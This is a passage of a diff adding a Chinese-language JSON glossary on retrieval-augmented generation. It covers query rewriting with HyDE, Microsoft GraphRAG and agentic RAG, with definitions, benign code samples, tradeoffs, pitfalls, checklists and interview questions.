+    "a": "召回不足则答案缺信息、模型可能编造；精确率低则上下文噪音多、成本上升，且可能被无关内容干扰。常见做法是检索阶段多召回，再用重排器提升前几名的精确率。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Ragas 文档",
+    "url": "https://docs.ragas.io/en/stable/"
+   },
+   {
+    "title": "RAGAS: Automated Evaluation of RAG (arXiv 2309.15217)",
+    "url": "https://arxiv.org/abs/2309.15217"
+   },
+   {
+    "title": "Wikipedia: Evaluation measures (information retrieval)",
+    "url": "https://en.wikipedia.org/wiki/Evaluation_measures_(information_retrieval)"
+   }
+  ]
+ },
+ {
+  "slug": "query-rewriting",
+  "def": "查询改写（Query Rewriting）是在检索前用规则或 LLM 把用户原始问题转换为更适合检索的形式，包括补全多轮对话中的指代、纠错与规范化、扩展同义词、拆分子问题、生成多个查询变体等。HyDE（Hypothetical Document Embeddings）是其中一种：先让模型生成假设答案，再用其嵌入去检索真实文档。它属于 RAG 的检索前处理层。",
+  "how": [
+   "接收用户问题与对话历史，判断是否需要改写（如含代词、过短、包含多个子问题）。",
+   "上下文改写：结合历史把问题改为独立完整的问题，如「它多少钱」→「X 产品的价格是多少」。",
+   "多查询/分解：生成若干同义改写或子问题，分别检索后合并结果（可用 RRF 融合排名）。",
+   "HyDE：让 LLM 写一段假设性答案文档，用它的向量检索，因为答案与文档在嵌入空间中更接近。",
+   "检索结果进入重排与生成；原问题仍用于最终回答，避免改写偏离用户意图。"
+  ],
+  "terms": [
+   {
+    "t": "独立问题改写 (Standalone Question)",
+    "d": "把依赖上下文的追问改写成无需历史即可理解的问题。"
+   },
+   {
+    "t": "HyDE",
+    "d": "用 LLM 生成的假设文档的嵌入进行检索。"
+   },
+   {
+    "t": "多查询检索 (Multi-Query)",
+    "d": "生成多个查询变体并合并检索结果，提升召回。"
+   },
+   {
+    "t": "Step-back Prompting",
+    "d": "先提出更抽象的上位问题检索背景知识。"
+   },
+   {
+    "t": "RRF (Reciprocal Rank Fusion)",
+    "d": "按排名倒数融合多路检索结果的简单方法。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "独立问题改写与 HyDE",
+   "src": "from openai import OpenAI\nclient = OpenAI()\nMODEL = \"gpt-4o-mini\"   # 示例，可换成任意聊天模型\n\ndef ask(prompt: str) -> str:\n    r = client.chat.completions.create(model=MODEL, temperature=0,\n        messages=[{\"role\": \"user\", \"content\": prompt}])\n    return r.choices[0].message.content.strip()\n\ndef standalone(history: str, question: str) -> str:\n    return ask(f\"对话历史：\\n{history}\\n\\n把最后的问题改写为不依赖历史、\"\n               f\"可独立检索的完整问题，只输出问题。\\n问题：{question}\")\n\ndef hyde_vector(question: str) -> list[float]:\n    fake_doc = ask(f\"写一段可能出现在帮助文档中的段落来回答：{question}\")\n    emb = client.embeddings.create(model=\"text-embedding-3-small\", input=fake_doc)\n    return emb.data[0].embedding   # 用它去向量库检索真实文档\n\nq = standalone(\"用户：你们的 Pro 套餐包含什么？\\n助手：包含……\", \"它多少钱？\")\nvec = hyde_vector(q)\n# hits = vector_db.search(vec, top_k=5)   # 检索后仍用原问题生成最终回答",
+   "note": "改写解决指代与口语问题；HyDE 以答案风格文本检索，代价是多一次 LLM 调用与延迟。"
+  },
+  "table": {
+   "title": "常见改写策略",
+   "head": [
+    "策略",
+    "解决的问题",
+    "代价"
+   ],
+   "rows": [
+    [
+     "独立问题改写",
+     "多轮对话中的指代",
+     "一次 LLM 调用"
+    ],
+    [
+     "多查询 + 融合",
+     "措辞与文档不匹配，召回低",
+     "多次检索，成本增加"
+    ],
+    [
+     "子问题分解",
+     "复合、多跳问题",
+     "检索次数多，需合并"
+    ],
+    [
+     "HyDE",
+     "问题短、与文档表述差异大",
+     "可能引入幻觉内容的偏差"
+    ],
+    [
+     "关键词/同义词扩展",
+     "专有名词、缩写",
+     "可能引入噪音"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "规则改写（同义词表、纠错）",
+    "pros": "快、确定、无额外调用",
+    "cons": "覆盖有限，维护词表",
+    "when": "领域术语固定"
+   },
+   {
+    "opt": "LLM 改写",
+    "pros": "灵活理解意图与上下文",
+    "cons": "增加延迟与成本，可能曲解",
+    "when": "多轮对话、口语化输入"
+   },
+   {
+    "opt": "不改写，靠混合检索 + 重排",
+    "pros": "架构简单",
+    "cons": "指代与多跳问题仍难",
+    "when": "单轮、问题规范的场景"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "改写后丢失用户的限定条件（时间、版本）",
+    "fix": "提示中要求保留实体与约束，并抽样检查改写结果"
+   },
+   {
+    "bad": "用改写后的问题生成最终回答",
+    "fix": "改写只用于检索，生成时使用原问题与对话上下文"
+   },
+   {
+    "bad": "HyDE 用于模型完全不了解的私有领域",
+    "fix": "假设答案可能方向错误，需评测，必要时与原查询检索结果融合"
+   },
+   {
+    "bad": "所有问题都改写，徒增延迟",
+    "fix": "先判断是否需要改写，或并行检索原问题与改写版本"
+   }
+  ],
+  "checklist": [
+   "多轮对话启用独立问题改写",
+   "改写提示要求保留实体与约束",
+   "原问题与改写结果均记录日志",
+   "用评测集对比改写前后的召回率",
+   "延迟预算包含改写调用"
+  ],
+  "interview": [
+   {
+    "q": "HyDE 为什么能提升检索？",
+    "a": "短问题与长文档在嵌入空间里分布不同；LLM 生成的假设答案在形式和用词上更像真实文档，用其向量检索更容易命中相关段落。即使内容有误，相关性信号往往仍有效。"
+   },
+   {
+    "q": "多查询检索如何合并结果？",
+    "a": "每个查询变体各自检索，再去重合并；常用 RRF 按各列表中的排名倒数求和排序，无需分数归一化。最后可交给重排模型精排。"
+   },
+   {
+    "q": "查询改写会不会带来风险？",
+    "a": "可能曲解意图、丢失约束或引入不存在的实体，导致检索偏离；也增加延迟与成本。需要日志记录改写结果、评测对比，并在不确定时回退到原问题检索。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "HyDE：Precise Zero-Shot Dense Retrieval (arXiv 2212.10496)",
+    "url": "https://arxiv.org/abs/2212.10496"
+   },
+   {
+    "title": "Query Rewriting for Retrieval-Augmented LLMs (arXiv 2305.14283)",
+    "url": "https://arxiv.org/abs/2305.14283"
+   },
+   {
+    "title": "Step-Back Prompting (arXiv 2310.06117)",
+    "url": "https://arxiv.org/abs/2310.06117"
+   }
+  ]
+ },
+ {
+  "slug": "graphrag",
+  "def": "GraphRAG 指在检索增强生成中引入知识图谱：先用 LLM 从文档中抽取实体、关系与声明构建图，再基于图结构（邻居、路径、社区）检索上下文。Microsoft 的 GraphRAG 方法还对图做社区划分并预生成分层社区摘要，以回答「数据集的主要主题是什么」这类需要全局理解的问题。它属于 RAG 的索引与检索层。",
+  "how": [
+   "把文档切分为文本单元，用 LLM 抽取实体（人、组织、地点、概念）及其关系与描述。",
+   "合并同名实体与重复关系，构建知识图谱，并可同时保存文本单元与实体的对应关系。",
+   "用 Leiden 等社区检测算法把图划分为分层社区，并用 LLM 为每个社区生成摘要报告。",
+   "全局搜索（Global Search）：对社区摘要做 map-reduce，汇总回答面向整个语料的宏观问题。",
+   "局部搜索（Local Search）：从问题相关的实体出发，取其邻居、关系与原文片段作为上下文回答具体问题。"
+  ],
+  "terms": [
+   {
+    "t": "知识图谱 (Knowledge Graph)",
+    "d": "以节点（实体）和边（关系）表示知识的数据结构。"
+   },
+   {
+    "t": "实体抽取 (Entity Extraction)",
+    "d": "从文本中识别实体及其类型、描述。"
+   },
+   {
+    "t": "社区检测 (Community Detection)",
+    "d": "把联系紧密的节点分组，GraphRAG 使用 Leiden 算法。"
+   },
+   {
+    "t": "全局搜索 / 局部搜索",
+    "d": "基于社区摘要回答宏观问题 / 基于实体邻域回答具体问题。"
+   },
+   {
+    "t": "多跳问题 (Multi-hop Question)",
+    "d": "需要串联多条事实才能回答的问题。"
+   }
+  ],
+  "code": {
+   "lang": "bash",
+   "title": "Microsoft GraphRAG 基本流程",
+   "src": "# 安装并在项目目录初始化（会生成 settings.yaml、.env 和 input/）\npip install graphrag\nmkdir ragtest && cd ragtest\ngraphrag init\n# 编辑 .env 中的 GRAPHRAG_API_KEY，把 .txt 文档放进 input/\n\n# 建立索引：实体关系抽取、社区检测、社区摘要（调用大量 LLM，先小样本试）\ngraphrag index\n\n# 全局搜索：回答面向整个语料的问题\ngraphrag query \"这批会议纪要的主要议题有哪些？\"\n\n# 局部搜索：围绕具体实体的问题\ngraphrag query \"张三参与过哪些项目，与谁合作？\" --method local\n\n# 注：命令参数随版本变化，旧版本使用 --root 与 --query，以官方 Get Started 为准",
+   "note": "索引阶段调用 LLM 次数与语料规模成正比，是主要成本来源；先用少量文档估算。"
+  },
+  "table": {
+   "title": "向量 RAG 与 GraphRAG 对比",
+   "head": [
+    "维度",
+    "向量 RAG",
+    "GraphRAG"
+   ],
+   "rows": [
+    [
+     "索引成本",
+     "嵌入计算，较低",
+     "LLM 抽取与摘要，较高"
+    ],
+    [
+     "擅长问题",
+     "定位具体事实与段落",
+     "关系、多跳、全局主题"
+    ],
+    [
+     "更新",
+     "增量嵌入简单",
+     "增量更新图与摘要较复杂"
+    ],
+    [
+     "可解释性",
+     "返回相似片段",
+     "可展示实体与关系路径"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "向量 RAG",
+    "pros": "简单、便宜、成熟",
+    "cons": "跨文档关系与全局问题效果差",
+    "when": "FAQ、文档问答等多数场景"
+   },
+   {
+    "opt": "GraphRAG",
+    "pros": "关系推理与全局摘要能力强",
+    "cons": "建图成本高、抽取有误差",
+    "when": "情报分析、研究资料、会议记录"
+   },
+   {
+    "opt": "混合（向量 + 图）",
+    "pros": "兼顾具体事实与关系",
+    "cons": "系统复杂度最高",
+    "when": "问题类型多样的大型知识库"
+   },
+   {
+    "opt": "轻量图方案（如 LightRAG）",
+    "pros": "降低建图与查询成本",
+    "cons": "成熟度与生态需评估",
+    "when": "想尝试图检索但预算有限"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "未估算成本直接对全部语料建索引",
+    "fix": "先用小样本测量 Token 消耗，再外推并设预算"
+   },
+   {
+    "bad": "问题大多是具体事实查询，却上 GraphRAG",
+    "fix": "先分析问题分布，事实型查询用向量/混合检索即可"
+   },
+   {
+    "bad": "忽视实体抽取错误与同名合并问题",
+    "fix": "抽查图谱质量，配置实体类型与消歧规则"
+   },
+   {
+    "bad": "语料频繁更新仍全量重建",
+    "fix": "评估增量索引能力，或按更新频率分层处理"
+   }
+  ],
+  "checklist": [
+   "确认问题确实需要关系或全局理解",
+   "小样本测算索引成本",
+   "抽查实体与关系抽取质量",
+   "与向量 RAG 基线做评测对比",
+   "规划语料更新与重建策略"
+  ],
+  "interview": [
+   {
+    "q": "GraphRAG 的全局搜索如何回答宏观问题？",
+    "a": "索引时已为各层社区生成摘要；查询时把相关层级的社区摘要分批交给 LLM 生成部分答案并打分（map），再汇总高分部分得到最终回答（reduce），避免只依赖少数相似片段。"
+   },
+   {
+    "q": "为什么向量检索难以回答「主要主题是什么」？",
+    "a": "这类问题需要综合整个语料，而向量检索只返回与问题最相似的少数片段，无法覆盖全局；问题本身也缺少与具体段落相似的关键词。"
+   },
+   {
+    "q": "GraphRAG 的主要局限？",
+    "a": "索引成本高、耗时长；LLM 抽取可能遗漏或产生错误关系；增量更新复杂；对具体事实查询未必优于向量检索。应基于评测与成本决定是否采用。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "From Local to Global: A GraphRAG Approach (arXiv 2404.16130)",
+    "url": "https://arxiv.org/abs/2404.16130"
+   },
+   {
+    "title": "Microsoft GraphRAG 文档",
+    "url": "https://microsoft.github.io/graphrag/"
+   },
+   {
+    "title": "Microsoft GraphRAG：Get Started",
+    "url": "https://microsoft.github.io/graphrag/get_started/"
+   }
+  ]
+ },
+ {
+  "slug": "agentic-rag",
+  "def": "智能体式检索（Agentic RAG）把检索封装成工具交给 LLM Agent，由模型在推理循环中自主决定是否检索、检索什么、使用哪个知识源、何时停止，并可基于中间结果改写查询、多跳追问或调用其他工具。它属于 RAG 与 Agent 的交叉层，用于复杂、多跳、需综合多来源的问题，代价是延迟、成本与行为不确定性上升。",
+  "how": [
+   "把一个或多个检索器（向量库、关键词搜索、SQL、Web 搜索）定义为带描述与参数的工具。",
+   "模型读取问题，判断能否直接回答；需要外部信息时生成工具调用和查询参数。",
+   "系统执行检索并把结果返回模型，模型评估信息是否充分、是否相关。",
+   "信息不足时改写查询、换知识源或拆分子问题继续检索，直到满足或达到步数上限。",
+   "模型基于累积的证据生成带引用的回答；系统记录完整轨迹以便评测与排查。"
+  ],
+  "terms": [
+   {
+    "t": "工具调用 (Tool Calling)",
+    "d": "模型输出结构化调用请求，由系统执行并返回结果。"
+   },
+   {
+    "t": "ReAct",
+    "d": "推理（Reason）与行动（Act）交替进行的 Agent 模式。"
+   },
+   {
+    "t": "多跳检索 (Multi-hop Retrieval)",
+    "d": "根据前一次检索结果发起后续检索。"
+   },
+   {
+    "t": "路由 (Routing)",
+    "d": "根据问题选择合适的知识源或检索方式。"
+   },
+   {
+    "t": "Self-RAG",
+    "d": "让模型自行决定检索并对检索与生成结果进行反思评估的方法。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "带步数上限的检索 Agent 循环",
+   "src": "import json\nfrom openai import OpenAI\nclient = OpenAI()\nTOOLS = [{\"type\": \"function\", \"function\": {\n    \"name\": \"search_docs\", \"description\": \"在公司知识库中检索相关段落\",\n    \"parameters\": {\"type\": \"object\", \"properties\": {\"query\": {\"type\": \"string\"}},\n                   \"required\": [\"query\"]}}}]\n\ndef agentic_rag(question: str, max_steps: int = 5) -> str:\n    msgs = [{\"role\": \"system\", \"content\": \"必要时调用 search_docs，可多次换关键词；信息足够后作答并注明来源。\"},\n            {\"role\": \"user\", \"content\": question}]\n    for _ in range(max_steps):\n        r = client.chat.completions.create(model=\"gpt-4o-mini\", messages=msgs, tools=TOOLS)\n        msg = r.choices[0].message\n        if not msg.tool_calls:                 # 模型认为信息已足够\n            return msg.content\n        msgs.append(msg)\n        for call in msg.tool_calls:\n            q = json.loads(call.function.arguments)[\"query\"]\n            msgs.append({\"role\": \"tool\", \"tool_call_id\": call.id,\n                         \"content\": search_docs(q)})   # search_docs 为你的检索函数\n    msgs.append({\"role\": \"user\", \"content\": \"已达检索上限，请基于现有信息作答并说明不确定处。\"})\n    return client.chat.completions.create(model=\"gpt-4o-mini\", messages=msgs).choices[0].message.content",
+   "note": "检索作为工具由模型自主调用；max_steps 限制循环，防止无限检索与成本失控。"
+  },
+  "table": {
+   "title": "RAG 形态对比",
+   "head": [
+    "形态",
+    "检索决策",
+    "适合问题",
+    "成本/延迟"
+   ],
+   "rows": [
+    [
+     "朴素 RAG",
+     "固定检索一次",
+     "单跳事实问题",
+     "低"
+    ],
+    [
+     "高级 RAG（改写+重排）",
+     "固定流程多步",
+     "表述不规范的问题",
+     "中"
+    ],
+    [
+     "Agentic RAG",
+     "模型动态决定",
+     "多跳、多源、开放问题",
+     "高且波动"
+    ],
+    [
+     "多智能体 RAG",
+     "多个 Agent 分工协作",
+     "大型研究型任务",
+     "最高"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "Agentic RAG",
+    "pros": "能处理复杂多跳问题，灵活使用多源",
+    "cons": "延迟和成本不可预测，难调试",
+    "when": "研究、分析、复杂客服"
+   },
+   {
+    "opt": "固定流程 RAG",
+    "pros": "可预测、便宜、易评测",
+    "cons": "复杂问题容易检索不全",
+    "when": "高频、简单问答"
+   },
+   {
+    "opt": "路由 + 固定流程",
+    "pros": "按问题类型分流，兼顾两者",
+    "cons": "需要可靠的分类器",
+    "when": "问题类型可区分的产品"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "不设步数与 Token 上限",
+    "fix": "限制最大检索次数与总 Token，超限后基于现有信息作答"
+   },
+   {
+    "bad": "工具描述含糊，模型乱选知识源",
+    "fix": "为每个工具写清用途、适用问题与参数示例"
+   },
+   {
+    "bad": "只评测最终答案，不看检索轨迹",
+    "fix": "记录并评测轨迹：检索次数、查询质量、冗余调用"
+   },
+   {
+    "bad": "检索结果原样塞入上下文，越积越长",
+    "fix": "截断或摘要工具结果，只保留相关片段与来源"
+   }
+  ],
+  "checklist": [
+   "设置最大步数、超时与 Token 预算",
+   "工具描述清晰且参数有校验",
+   "记录完整推理与检索轨迹",
+   "与固定流程 RAG 基线对比效果与成本",
+   "回答附带来源引用",
+   "检索结果中的指令被视为数据，防提示注入"
+  ],
+  "interview": [
+   {
+    "q": "什么时候应该用 Agentic RAG 而不是普通 RAG？",
+    "a": "问题需要多跳推理、组合多个来源、或第一次检索后才知道下一步查什么时。若问题多为单跳事实查询，普通 RAG 更快更便宜、更容易评测。"
+   },
+   {
+    "q": "如何评测 Agentic RAG？",
+    "a": "除最终答案正确性与忠实度外，还要评测轨迹：是否调用了正确工具、查询是否合理、检索次数是否冗余、是否在信息足够时停止，以及每题成本与延迟分布。"
+   },
+   {
+    "q": "Agentic RAG 有哪些安全风险？",
+    "a": "检索到的文档可能包含提示注入，诱导 Agent 调用其他工具或泄露数据；循环可能耗尽预算。需要把工具结果当作不可信数据、限制工具权限、设置预算与人工审批。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Agentic RAG Survey (arXiv 2501.09136)",
+    "url": "https://arxiv.org/abs/2501.09136"
+   },
+   {
+    "title": "Self-RAG (arXiv 2310.11511)",
+    "url": "https://arxiv.org/abs/2310.11511"
+   },
+   {
+    "title": "Anthropic：Building effective agents",
+    "url": "https://www.anthropic.com/engineering/building-effective-agents"
+   }
+  ]
+ }
+]
